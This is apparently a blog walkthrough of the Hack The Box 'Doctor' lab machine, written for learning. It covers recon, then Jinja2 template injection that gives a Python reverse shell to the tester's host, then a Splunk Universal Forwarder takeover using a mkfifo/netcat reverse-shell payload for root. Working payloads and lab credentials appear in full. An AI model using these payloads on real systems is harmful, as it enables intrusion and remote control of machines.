
# 🛠️ Your Arsenal for HTB: Doctor

Before diving in, **gear up**. This is your **arsenal**—the essential tools you’ll be using to break through the Doctor’s defenses.  

| 🛠️ Tool              | 🔍 Purpose |
|----------------------|------------------------------------------------|
| **[[Nmap]]**         | Reconnaissance, scanning open ports & services. |
| **[[Burp Suite]]**   | Intercepting & modifying web requests. |
| **[[nano / mousepad]]** | Editing files and payloads on the go. |
| **[[XSS Payloads]]** | Injecting malicious JavaScript into web inputs. |
| **[[SQL Injection Payloads]]** | Exploiting backend databases. |
| **[[SSTI Payloads]]** | Breaking into server-side templates. |

💡 **Tip:** Think of this arsenal as your starting gear use it to **explore the box freely** before diving into the full walkthrough. If you prefer a spoiler-free approach, keep these tools in mind and see how far you can get on your own!

---

Alright, let’s get to it. This box requires you to **submit two flags**: a **user flag** and a **root flag**. That means we need to **get a foothold as a user** before **escalating to root**.

Now, my approach? I treated it like an **internal penetration test**. After grinding through **TCM Security’s PJPT, PWPA, and PWPP**, I developed a habit of **jumping straight to the IP** to check if **port 80** was open.

But instead of **rushing in blind**, let’s **apply what I learned from the PJPT** and start with **proper recon**.

It’s time to use our **first weapon** in the arsenal... **Nmap.**

Let's run **Nmap** with our handy-dandy flags:

```bash
nmap -sV -sC -Pn -T4 10.10.10.209
```

Here’s what each flag does:

| **Flag** | **What it Means (Dumbed Down Version)**                                                                                                                                                       |
| -------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `-sV`    | "Hey Nmap, tell me what versions of services are running on open ports." Example: It can tell us if a web server is **Apache 2.4.41** instead of just saying **"There’s a web server here."** |
| `-sC`    | "Run some **built-in scripts** to check for **extra info** about the target." Think of this as **Nmap’s autopilot mode** for quick scans.                                                     |
| `-Pn`    | "Skip the 'ping' check and **assume the machine is online**." Some firewalls **block ping requests**, so this helps us **scan anyway**.                                                       |
| `-T4`    | "Scan **fast** but not too fast." (On a scale from **T0** = "Super sneaky" to **T5** = "Super aggressive," T4 is the sweet spot for speed without breaking stuff.)                            |

---
### **In Simple Terms:**

We are **checking for open ports**, **figuring out what services are running**, **grabbing version info**, and **running some built-in checks**, all while making sure the scan **doesn’t get slowed down by firewalls blocking pings**.

---

Here is our result:

![[nmap-results.png]]


Sick, so we got **port 80 open**, but something even more interesting—**Splunk**. Seeing **port 8089/tcp open** with **ssl/http** and **Splunkd httpd** strongly suggests **Splunk is running on this machine**.

💡 **Note:** Splunk is a **log analysis & monitoring tool** with a **web interface and an API**, meaning **it could be useful for exploitation later**. The **8089 port is its management interface**, which might let us **execute commands, view logs, or grab credentials** if we can get access.

Let’s **keep this in our back pocket** for now. First, let’s **check out port 80** open up **Firefox** and head to `http://10.10.10.209` to see what’s there.

This is what we see:

![[homepage.png]]

## Exploring the Health Solutions Web App

We’ve landed on what appears to be a **Health Solutions Web Application**. As web app pentesters, our next step is clear—**start enumerating**. Even though this is a Hack The Box lab, we should still approach it like a real-world assessment and gather as much intel as possible.

## First Impressions Matter

If you’ve already used **ffuf** or **Dirbuster**, you might have noticed **empty responses**. That in itself is useful information. It suggests that directory enumeration might not be the best approach here.

So, let’s take a step back and focus on **what’s right in front of us**.

- **A phone number** – Don’t call it. You’re a hacker, not a telemarketer.
- **A physical address** – Don’t visit it. We’re breaking into networks, not committing trespassing.
- **An email address** – Now that’s actually interesting.

The email we see is:

```
info@doctors.htb
```

This tells us something important—there’s a good chance `doctors.htb` is an active domain and might be useful for further enumeration.

## Mapping doctors.htb to Our Hosts File

Before we can check it out in the browser, we need to map the domain to our target’s IP. This is where the **/etc/hosts file** comes in.

The `/etc/hosts` file is a local DNS override. Normally, when you type a domain like `google.com`, your computer reaches out to a DNS server to figure out the corresponding IP address. But the hosts file lets us **manually assign domain names to IP addresses**, essentially telling our system,  
_"Hey, when I type `doctors.htb`, don’t go looking for it on the internet—just send me straight to `10.10.10.209`."_

To do this, open the hosts file:

```bash
sudo mousepad /etc/hosts
```

or nano or vim whatever you prefer I know everyone has there preferences, just make sure you know how to exit out of the text editor :)

Then add the following line:

```
10.10.10.209 doctors.htb
```

## Why This Works

- The machine likely **expects** us to access it via `doctors.htb` rather than just the IP address.
- Some web applications behave **differently** depending on the hostname used, often due to **virtual hosting**.
- This could unlock **new content, new functionality, or even a hidden login page** that wasn’t visible when we visited the raw IP.

## Why We Can Do This

Since we are connected to the **HTB VPN**, we are inside a **simulated internal network**, just like we would be during an **internal penetration test** for a client. Because of this, we can reach `10.10.10.209` directly, meaning any domain names the machine recognizes internally could be useful to us.

Some web servers are **configured to respond only to specific hostnames**. If the site is using **virtual hosting**, it might not serve the correct content unless we request it using the expected domain name (`doctors.htb`).

By modifying our `/etc/hosts` file, we are essentially telling our machine:  
_"When I type `doctors.htb`, send the request to `10.10.10.209` instead of looking for it on the internet."_

If the backend is set up to recognize `doctors.htb`, our request will be processed correctly, potentially revealing new pages, login portals, or functionality that weren’t accessible when we used just the raw IP.

Save the file. Now, we can navigate to `http://doctors.htb` and see what’s waiting for us.

![[login.png]]

## A New Page, But Not Quite What We Expected

Awesome, we actually got somewhere new! But hold on—something looks off. If you're like me, the first thing you’ll notice is that the page **doesn’t fully load**. The styling might be broken, things might look out of place, and at first glance, it feels like we hit a dead end.

Here’s the thing: **don’t panic.** I almost did when I first worked on this box. My immediate thought was, _"Did I mess something up? Is this supposed to happen?"_ But I kept going anyway, because curiosity got the best of me—and that turned out to be the right move.

Later on, after stepping away from the box for a bit and coming back, I noticed the page had actually **fully loaded** in the browser tab. So, if your first impression is that things look broken, don’t stress. It might just take a little patience.

That said, even if the page still looks weird, we can **still interact with the web app** and move forward. The important part is that we got a response, and that means there’s something here worth exploring.

## **Endpoint: /login?next=%2F**

Here, we have **a lot** of information packed into a small login screen. At first glance, it might just seem like a standard authentication page, but if you pay attention, there’s plenty to take note of:

- **Login and Register options**
- **A login form** that takes an **email and password**
- **A "Remember Me" checkbox**
- **A "Forgot Password" feature**
- **A "Sign Up Now" link**

That’s a lot of potential attack surfaces. But for now, we’re keeping it simple—we’ll **register a new user** and see what happens after signing up.

---

### **📌 Side Note: Web App Pentesting Considerations (Feel Free to Skip This Section)**

> This is **not part of the walkthrough**, so if you just want to follow the steps, feel free to skip this. But if you're looking to sharpen your web app pentesting mindset, this section is for you.

If this were a real-world web app penetration test, this page should immediately trigger a few thoughts:

- **Does the login form have SQL injection vulnerabilities?**
    
    - If we had usernames from reconnaissance, we could try **SQL injection for authentication bypass**.
    - Could there be a **second-order SQL injection** vulnerability somewhere deeper in the application?

- **Could this be vulnerable to stored XSS?**
    
    - Does it reflect user input somewhere on the page?
    - If we register, does our username or email get displayed anywhere else later?

- **Are there broken access controls?**
    
    - Can we access restricted areas by modifying the request?
    - What happens if we sign up and try visiting `/admin`?
- **What’s happening with session management?**
    
    - Does Burp Suite show that this page sets **cookies** when we log in?
    - If we check the "Remember Me" box, how does that affect the request and response?
    - Can we manipulate cookies to maintain access longer than intended?

- **What about race conditions on the "Forgot Password" feature?**
    
    - If we spam password reset requests, do we cause weird behavior?
    - Could an attacker potentially exploit this for account takeover?

Again, this is **extra knowledge for web app pentesters**, not a required step for solving the box. If you’re here for the walkthrough, skip ahead—we’re about to **register a new user and see where it takes us**.


## Lets register as a user:

![[register.png]]

---

## **Registering a User: Another Piece of the Puzzle**

Alright, we made it to the **registration page**, and once again, we’re hit with a **ton of information**. Let’s **break it down** before we start smashing that "Sign Up" button like it owes us money.

First things first, take note of the **endpoint**:  
`/register`

Simple enough. Now, let’s eyeball the form itself—what do we have here?

- **Username** field – Potentially linked to a database field? 👀
- **Email** field – Might be used for login and account recovery.
- **Password + Confirm Password** – Classic. But how picky is it?

Our immediate goal is **just to push further into the web app**—think **horizontal movement** first, **vertical later**. Like Heath Adams from TCM Security always preaches:

> **"Lateral, Lateral, Lateral until you can’t anymore, then you start looking for vertical movement."**

Keep this in mind as we move forward. We’re just getting started.

---

### **💡 Web App Pentesters, keep your eyes opened**

If you’re into **web app pentesting**, this is where your **spidey senses** should be tingling. There’s a lot to consider here, even if we’re not actively testing yet:

- **Usernames in forms?** → Probably stored somewhere in a database. Is it vulnerable to **SQL injection**?
- **Passwords?** → Are there **complexity requirements**? What if we try a **one-character password**—does it throw an error? Can we **break the form** by skipping password confirmation?
- **Form validation?** → Are we dealing with **client-side validation** (easily bypassed) or proper **server-side validation**?
- **Stored XSS / SQLi?** → If we see usernames displayed anywhere later, that means **potential attack surface**.
- **What happens after we register?** → Are we auto-logged in? Redirected? Are there **session cookies** being set?

**You don’t need to test all of this right now,** but if this were a real **web app pentest**, you’d be **taking notes, grabbing screenshots, and thinking five steps ahead.**

For now, let’s **get signed up** and see what’s next. 

---

## **Registering a User: Another Piece of the Puzzle**

![[home-doctors.png]]

Okay we have progressed further into the web application, now we see we can write a new message! We can also take note of the url as well here a new endpoint! /Home. As a web app pentester at this point we should also be checking burp suite to see if we get a cookie associated with our login. For now lets just click on New Message and see what we get we still want to keep moving laterally.


![[post-new.png]]

We see that we can make a post. We get a title and comment. Here what comes to mind are three things now, XSS, SQL Injection, and template injection. Out of the three XSS and Template Injection are the fastest ones to test. This is because we can quickly use simple payloads and see what could possibly work and decide whether or note its worth our time to investigate. I am writing this with a mentality of a web app pen test so I would spend a lot of time here testing a couple of things out but this is a box with the goal  to get the user flag and the root flag so we still have to move laterally. Lets make a simple post here and simatanosuly just include what would be an xss payload just to see how the web application reacts. Lets just do a 2 birds with one stone kinda deal. Lets write 

```html
<h1>xss</h1>
<strong> xss </strong>
```
for the title and for the content  and see what we get:


![[xss-payload.png]]

Alright we don't get anything reflected back, ***lets just quickly check the source code*** to see what's up!

![[source-code-xss.png]]

Looks like our payload is being filtered out, so this saves us some time in future XSS payloads, perhaps we will need to bypass their filer, but for now lets just keep this in our notes and move on to template injection!

### **Moving On: Template Injection**

Looks like our XSS payload is getting filtered. Good to know—it saves us time messing with basic payloads. We’ll keep this in our notes in case we need to bypass it later, but for now, let’s see what’s up with template injection.

Template injection happens when user input is processed by a template engine in an unsafe way. Instead of guessing which engine is in use, we’ll start with a **polyglot payload**, a string designed to trigger errors across multiple engines:

```plaintext
${{<%[%'"}}%\.
```

If the app processes this as a template, we might get a **500 Internal Server Error**, which is exactly what we want. That would tell us the input is being evaluated, meaning we could be looking at a way to execute commands or leak sensitive data. If nothing happens, input is likely sanitized. 

Alright, let’s see what happens if we **drop our polyglot payload** into both the **Title** and **Message** fields. This is our quick-and-dirty way of testing whether the app might be **evaluating** any kind of template syntax. Here we go:

**Step 1**:  
![[post-polygot.png]]

**Step 2**:  
![[polyglot-reflected.png]]

So, what happens? The payload is getting **reflected** back at us, albeit in a **sanitized form**. We did **not** trigger a **500 internal server error**, which usually indicates that the input is being directly evaluated by a template engine. This suggests there’s **some** filtering in place, similar to what we saw with our XSS attempt.

But let’s poke around the **source code** to see if the developer might’ve left behind any **bread crumbs**.

![[source-code-archive.png]]

Sure enough, in the code, there’s a **comment** mentioning another endpoint called **/archive**. Given what we’ve seen so far—our message posts, how they’re stored, etc. it’s a pretty safe bet that **/archive** might be some kind of **archival page** for all user posts. Let’s go check it out.

![[archive-error.png]]

Oh yeah, **this** is the stuff we like to see! We’ve got an **error page**, which strongly hints at **Template Injection**. But we still don’t know which **template engine** is behind the scenes. We also don’t know **which part** of our polyglot was actually swallowed by the template.

To figure that out, we can do one of two things:

1. **Use a browser extension** (like **Wappalyzer**, which my TCM Security instructor recommended) to see what technologies the site might be running.
2. **Rely on other tools**—for instance, we can fire up **Burp Suite** and glean more details from the HTTP responses.

Let’s keep it simple and lean on **Burp Suite**. One of the most common next-step payloads to test for **Server-Side Template Injection (SSTI)** is:

```
{{7*7}}
```

We’ll also consult the handy **flowchart** below (screen shot is from payloadsallthethings):

![[ssti-flowchart.png]]

The reason I’m picking `{{7*7}}` first is because, per **PayloadsAllTheThings**, these are classic quick-check payloads:

- `{{7*7}}` → typically for **Jinja2 (Python)**
- `#{7*7}` → typically for **Thymeleaf (Java)**

Let’s give `{{7*7}}` a whirl. But remember, our **/archive** endpoint is currently **spitting out** a 500 error due to our original post. We need to **remove** that troublesome post first, then create a **fresh** one with our new payload.

**The plan:**

1. **Delete** our existing post (the one causing the 500 error at /archive).
2. Go back and create a **new message**—this time, both Title and Content will be `{{7*7}}`.
3. **Confirm** that we see it on the main page.
4. Visit **/archive** again.

Let’s pop open **Burp Suite** and watch the **HTTP history** for `/home` and `/archive`.

- **BurpSuite /home endpoint**:  
    ![[burp-server-identity.png]]
    
- **BurpSuite /archive endpoint**:  
    ![[archive-49.png]]
    

Two big takeaways here:

1. The server at `/home` is clearly running **Python**.
2. Our `{{7*7}}` payload **evaluated** to **49**.

Referring back to the flowchart, that means we’re likely dealing with **Jinja2** (or possibly Twig). But since Twig is a **PHP** template engine and we see Python under the hood, we can safely bet on **Jinja2**.

This is good news! Now that we have a potential **SSTI** and a strong guess it’s **Jinja2**, we can try **another** quick test: `{{7*'7'}}`. That goofy-looking payload is just `7 multiplied by the character '7'`, which should come out to **7777777** if it works.

Let’s post **another** new message using only the Title field this time (so we’re not cluttering up the page with multiple payloads). Revisit **/archive**, crack open the source, and if all goes well, you’ll see **49** (from our previous payload) and now **7777777**. That all but confirms **Jinja2**. Next stop: **RCE** territory!

![[archive-jinja-payload.png]]

---

## Understanding the Big Guns: Jinja2 RCE Payloads

Now, this is where things get interesting. Check out this monster payload:

```python
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ip\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/cat\", \"flag.txt\"]);'").read().zfill(417)}}{%endif%}{% endfor %}
```

Yes, it’s **ugly**. And yes, it’s **powerful**. As a web app pentester, it’s important to at least understand this at a **high level**:

- It’s basically iterating over Python’s **internal classes** to find a way to execute OS commands.
- It uses `popen` to run a **Python reverse shell** (in this example, pulling in the contents of `flag.txt`).

So, if you see payloads like this during an engagement (or on HTB), don’t panic—treat them like any other **tool** in your kit. Keep notes on how they work, save them in your personal GitHub repo, or revisit **PayloadsAllTheThings** for a refresher. They’re meant to be **dropped in**, tested, and (hopefully) let you shell the box.

### **Breaking Down the Madness: Jinja2 RCE Payload Explained**

Alright, let’s take a step back because this payload looks like absolute chaos at first glance. If you're wondering, **"What the hell am I even looking at?"**, you're not alone. But don't worry, we’re gonna break it down **high-level style** so it actually makes sense.

#### **Step 1: What’s Happening Here?**

```python
{% for x in ().__class__.__base__.__subclasses__() %}
```

- This **loops through Python’s internal subclasses** to find something useful.
- Specifically, it's looking for a **class related to warnings**, because some warning-related classes expose **built-in functions** that can execute system commands.

#### **Step 2: Finding the Right Class**

```python
{% if "warning" in x.__name__ %}
```

- This **filters** for subclasses that contain `"warning"` in their name.
- The reason? There’s a sneaky way to **access Python’s built-in modules** through certain system warning classes.

#### **Step 3: Importing the OS Module & Running a Command**

```python
{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os; ...
```

- **`__import__('os')`** dynamically imports the **OS module**, which lets us interact with the system.
- **`popen()`** is used to execute a command, in this case, a **Python one-liner reverse shell**.

#### **Step 4: What’s Actually Running?**

```python
python3 -c 'import socket,subprocess,os; 
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); 
s.connect(("ip",4444)); 
os.dup2(s.fileno(),0); 
os.dup2(s.fileno(),1); 
os.dup2(s.fileno(),2); 
p=subprocess.call(["/bin/cat", "flag.txt"]);
```

Here’s what this is doing **step-by-step**:

1. **Creates a TCP socket** (`socket.socket(socket.AF_INET,socket.SOCK_STREAM)`)
2. **Connects to the attacker's machine** on `IP: 4444`
	1. Be sure to change the IP to your connected IP!
3. **Redirects stdin, stdout, and stderr** to the socket (`os.dup2()`)
4. **Runs a command** (`subprocess.call(["/bin/cat", "flag.txt"])`)

---

### **The Important Part We Care About**

The key part we need to **modify** is:

```python
subprocess.call(["/bin/cat", "flag.txt"]);
```

- This is just **reading** `flag.txt`.
- Instead, we want to **spawn an interactive shell**.

#### **Making It Interactive**

To actually **get a shell**, we replace `cat flag.txt` with `/bin/bash -i`, like so:

```python
subprocess.call(["/bin/bash", "-i"]);
```

This ensures that when we **connect back**, we get an **interactive shell** instead of just a single command execution.

---

### **Also, Don’t Forget the Port!**

```python
s.connect(("ip",4444))
```

- The number **4444** is the **port we need to listen on**.
- Before running the payload, make sure to **set up a listener** on your attacking machine:
    
    ```bash
    nc -lvnp 4444
    ```
    
    This will **catch** the incoming connection and drop us into a shell.

---

### **Testing Our RCE Payload: Showtime**

Now that we’ve dissected our payload and know how it works, let’s take it for a **test drive**. We’ll first see what happens **before** we change the command inside.

1. **Craft a new message post** and drop the RCE payload right into the **Title** field.
2. **Save** the post and head back to `/home` to confirm it’s there.

**Example:**

![[title-payload.png]]

Looks like the board **accepted** our payload. Next, we head on over to `/archive`—this endpoint is basically the **launch pad** for any SSTI goodies we want to fire off.

Before we do that, don’t forget to **set up your listener**:

```plaintext
nc -lvp 4444
```

**Now**, with the listener running, we **browse to `/archive`** and cross our fingers, hoping we see an attempt to grab `flag.txt`.

![[jinja-payload-failed.png]]

Sweet! We **did** get a connection, and our payload indeed tried to **cat `flag.txt`**. That’s a good sign—the fundamentals are working. All we have to do now is **swap out `cat flag.txt`** for a **full-blown shell** using `/bin/bash -i`.

---

### **Tweaking the Payload for a Shell**

Here’s the snippet we need to modify:

![[bash-payload.png]]

Basically, we **replace**:

```python
subprocess.call(["/bin/cat", "flag.txt"]);
```

with:

```python
subprocess.call(["/bin/bash", "-i"]);
```

I’ve got it in the **Message Body** just so you can see it clearly, but you want to **actually place it in the Title** (or wherever the template gets evaluated).

Oh before we fire it away, please also change the IP address it should be to the address you get when you run `ifconfig` the tun0, or if you are on kali it should be visible on the upper right corner of the screen.

---

### **Fire When Ready**

With our payload updated, we repeat the same steps:

1. **Paste the modified payload** into the Title field.
2. **Save** it.
3. **Pop over to `/archive`** to trigger the code.
4. Watch your **listener** for the shell.

Boom, **Reverse Shell** acquired. That moment where you see your terminal spring to life is pure pentester bliss. Almost like a fine wine, take a second and savor it.

![[reverse-shell-success.png]]

As you can see, I tested it by running `pwd` and `id` just to confirm where I ended up and who I’m running as. And with that, we’ve got our **initial foothold** on the box!

Here is the payload one more time just in case you didn't get it to run like I did.
```python
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.38\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\", \"-i\"]);'").read().zfill(417)}}{%endif%}{% endfor %}


```




### **💻 Leveling Up: Making Our Shell Interactive**

Alright, we got our initial foothold, but before we start poking around, let’s fix something that might cause a headache later.

Since this server is running Python, we can use a quick trick to **upgrade our shell** into something more interactive. You technically don’t **need** to do this to complete the box, but trust me, it’ll save you some frustration. Without an interactive shell:

- You won’t see password prompts when running commands like `su` (yeah, I learned that the hard way)
- You can’t use shortcuts like `CTRL+C` or `CTRL+Z` properly
- Some programs just won’t work right

To avoid these issues, run this as soon as you get a shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Now you’ve got a **fully interactive shell**, and you won’t be left wondering why your commands aren’t doing anything.

### **🔍 Digging Through Logs for Credentials**

Now that we’re comfortable, let’s start hunting for useful information. A good place to look is **log files**. Sometimes, admins log in too fast and accidentally type their password where it doesn’t belong, or a system might log authentication failures that reveal useful usernames or passwords.

To check for any low-hanging fruit, run:

```bash
grep -R -o "password" /var/log
```

Here’s what we get:

![[enum-user-creds.png]]

First thing that jumps out is all the **permission denied** errors. No surprise there—we don’t have access to everything yet. But look a little closer and you’ll see something interesting.

There’s a **failed login attempt** for an invalid user named `shaun`. Right below that, we see the string **Guitar123**, but there’s no `@` symbol or domain name next to it. Looks like someone fat-fingered their password into the email field.

So, we might have just found creds:

```
shaun:Guitar123
```

### **🔑 Switching to Shaun’s Account**

Let’s test the creds and see if we can log in as `shaun`. Run:

```bash
su shaun
```

If the password works, you should see this:

![[login-shaun.png]]

Nice. We’re in. Since we need a **user flag**, it’s safe to assume it’s somewhere in Shaun’s home directory. Let’s start looking around.

### **🕵️‍♂️ Finding the User Flag**

I went up a directory and saw two interesting folders:

- **web** (looks like it has a blog and a script named `blog.sh`)
- **shaun** (which, based on experience, probably has our flag)

I checked inside `shaun` and sure enough, **user.txt** was sitting there. Let’s grab the flag:

```bash
cat user.txt
```

![[userflag.png]]

There it is. The **user flag** is ours. Now we can head back to HTB, submit it, and move on to the real challenge—getting root.

### **🔎 Revisiting Our Recon: What About Splunk?**

During our initial Nmap scan, we saw that **Splunk Universal Forwarder** was running on port **8089**. That stood out because Splunk has a **management interface** that could let us execute commands if we get access.

To confirm, let’s check what processes are running:

![[grep-splunk-proc.png]]

Yup, it’s running. Time to do some **research** and see if there’s a way to exploit it. A quick Google search led me to this page:

[SplunkWhisperer2 - Splunk Universal Forwarder Hijacking](https://clement.notin.org/blog/2019/02/25/Splunk-Universal-Forwarder-Hijacking-2-SplunkWhisperer2/)

And the GitHub repo for the tool:

[SplunkWhisperer2 GitHub](https://github.com/cnotin/SplunkWhisperer2)

If you’ve never done a box like this before, don’t be surprised if you need to download extra tools that weren’t in your original game plan. That’s normal in both CTFs and real-world pentesting. The more tools you get comfortable with, the better.

One issue I ran into—HTB’s VPN connection was **blocking** my download from GitHub. If you have the same problem, just **disconnect from the VPN, download the tool, and reconnect**.

### **🚀 Exploiting Splunk Universal Forwarder**

Let’s see if we can execute commands using this tool. First, we’ll start with a simple `id` command to test if we have remote code execution (RCE):

```bash
python3 PySplunkWhisperer2_remote.py --host 10.10.10.209 --lhost 10.10.14.38 --payload id
```

That didn’t work—we got an **authentication failure**.

![[pySplunkError.png]]

No big deal. We already found Shaun’s credentials earlier, so let’s **try logging in with those** and see if we can get a full shell instead of just running one command.

First, open up a listener on your machine:

```bash
nc -lvp 1994
```

Now, run the exploit with the **correct credentials** and a **reverse shell payload**:

```bash
python3 PySplunkWhisperer2_remote.py --host 10.10.10.209 --username shaun --password Guitar123 --lhost 10.10.14.38 --payload 'rm /tmp/0xjcbk_pipe;mkfifo /tmp/0xjcbk_pipe;cat /tmp/0xjcbk_pipe|/bin/sh -i 2>&1|nc 10.10.14.38 1994 >/tmp/0xjcbk_pipe'
```

Here’s what’s happening:

- `--host 10.10.10.209` → Target machine
- `--username shaun` → Using Shaun’s creds
- `--password Guitar123` → The password we found in the logs
- `--lhost 10.10.14.38` → Our attacking machine
- `--payload` → Reverse shell that connects back to us

We run the command, and boom—**RCE success**.

![[pysplunkRCE.png]]

### **🎯 Getting Root**

Let’s check our listener:

![[root.png]]

We got a shell. First thing I did was run `ls` to see where I was. The `pwd` command wasn’t giving me output, but `ls` helped me figure out my location.

I spotted a **root** folder, checked inside, and sure enough—**root.txt** was sitting there. Let’s grab the final flag:

```bash
cat root.txt
```

And just like that, **we rooted the box**.

### **🛠️ Final Thoughts**

This was my first full HTB box, and I gotta say—it was **a blast**. We started with **basic web enumeration**, leveraged **SSTI for initial access**, pivoted with **log analysis for credentials**, and finished strong by **exploiting Splunk Universal Forwarder for root**.

Hope you enjoyed the walkthrough as much as I did writing it. See you in the next one!